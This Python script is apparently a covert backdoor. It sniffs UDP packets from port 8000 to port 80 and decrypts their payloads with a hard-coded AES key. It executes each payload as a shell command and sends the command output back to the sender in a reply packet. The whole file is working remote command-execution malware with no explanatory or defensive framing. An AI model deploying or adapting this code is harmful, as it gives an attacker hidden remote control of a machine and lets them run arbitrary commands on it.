#!/usr/bin/python

import sys, os, argparse, socket, subprocess, logging, time, base64
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess
from Crypto.Cipher import AES

MASTER_KEY = '12345678901234567890123456789012'

def encrypt(data):
  secret = AES.new(MASTER_KEY)
  tagString = str(data) + (AES.block_size - len(str(data)) % AES.block_size) * "\0"
  cipherText = base64.b64encode(secret.encrypt(tagString))
  return cipherText

def decrypt(encryptedData):
  secret = AES.new(MASTER_KEY)
  rawDecrypted = secret.decrypt(base64.b64decode(encryptedData))
  data = rawDecrypted.rstrip("\0")
  return data

FILTER = "udp and (dst port 80) and (src port 8000)"


def remoteExecute(pkt):
    print "==============================================="
    command = decrypt(pkt['Raw'].load)
    print command
    print "==============================================="

    variable = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ouput = "\nOUTPUT:\n" + variable.stdout.read() + variable.stderr.read()

    pkt2 = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/ouput
    print pkt2.show
    print "==============================================="
    time.sleep(0.5)
    send(pkt2)

def stopfilter(pkt):
    return True

def main():

    sniff(filter=FILTER, prn=remoteExecute)

if __name__ == '__main__':
    main()
